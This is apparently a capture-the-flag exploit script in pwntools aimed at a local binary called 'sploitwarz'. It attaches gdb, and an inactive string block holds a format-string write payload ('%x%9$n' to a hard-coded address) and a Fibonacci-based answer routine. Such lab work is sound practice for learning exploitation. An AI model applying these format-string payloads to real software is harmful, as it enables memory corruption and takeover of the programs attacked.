from pwn import *
import os
from subprocess import Popen
def is_fibonacci(n):
    phi = 0.5 + 0.5 * math.sqrt(5.0)
    a = phi * n
    return n == 0 or abs(round(a) - a) < 1.0 / n

io = process('./sploitwarz')
context.log_level = 'DEBUG'

context(arch='i386', os='linux')
context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['tmux', 'splitw', '-v']
gdb.attach(io, execute="b *0x4000000")
pause()


'''
#raw_input("What to do ?")
io.recvuntil("?")
#payload = fmtstr_payload(9, {0x56559cbc:0x5655655c},0,'byte')
#io.sendline(payload)
io.sendline("\xbc\x9c\x55\x56"+"%x%9$n")
io.recvuntil("?")
io.sendline("g")
io.recvuntil("):")
io.sendline("1")
io.recvuntil(":")
values=[]
for i in range(6):
	a=io.recvline()
	a=a[3:]
	a=a.rstrip()
	a=a.lstrip()
	try:
		values.append(int(a))
	except ValueError:
		pass
print values
pause()
print "This process has the pid", os.getpid()
print "Child process pid", io.pid
raw_input("Wait here")
for i in range(5):
	if not is_fibonacci(values[i]):
		#print "Sending", i+1
		io.sendline(str(i+1))

io.interactive()
'''
